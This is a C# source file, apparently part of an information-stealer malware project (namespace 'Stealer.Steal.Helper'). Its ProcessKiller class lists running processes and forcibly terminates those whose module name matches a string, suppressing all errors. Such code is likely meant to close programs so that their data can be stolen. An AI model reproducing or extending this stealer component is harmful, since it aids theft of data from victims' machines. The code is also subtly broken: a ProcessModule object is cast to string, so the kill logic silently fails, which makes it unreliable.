using System.Collections.Generic;
using System.Diagnostics;

namespace Stealer.Steal.Helper;

internal class ProcessKiller
{
	public static List<object[]> objects = new List<object[]>();

	public static void Dump()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				objects.Add(new object[2] { process.Id, process.MainModule });
			}
			catch
			{
			}
		}
	}

	public static string Kill(string name)
	{
		string result = string.Empty;
		foreach (object[] @object in objects)
		{
			try
			{
				if (((string)@object[1]).Contains(name))
				{
					Process.GetProcessById((int)@object[0]).Kill();
					result = (string)@object[1];
				}
			}
			catch
			{
			}
		}
		return result;
	}
}
